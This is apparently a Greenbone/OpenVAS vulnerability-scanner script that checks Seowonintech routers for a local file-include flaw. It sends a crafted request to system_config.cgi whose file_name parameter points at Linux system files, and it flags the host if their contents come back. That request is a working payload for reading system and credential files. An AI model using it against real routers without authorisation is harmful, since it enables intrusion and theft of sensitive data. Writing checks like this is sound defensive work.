if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103744" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_name( "Seowonintech Routers Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/seowonintech-routers-remote-root-file-dumper" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-24 12:38:49 +0200 (Mon, 24 Jun 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_thttpd_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "thttpd/detected" );
	script_tag( name: "solution", value: "Ask the vendor for an Update." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "The remote Seowonintech Router is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the computer. Other attacks are
  also possible." );
	script_tag( name: "affected", value: "Seowonintech Router Firmware <= 2.3.9 is vulnerable. Other versions may also be affected." );
	exit( 0 );
}
CPE = "cpe:/a:acme:thttpd";
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/cgi-bin/system_config.cgi?file_name=/" + file + "&btn_type=load&action=APPLY";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

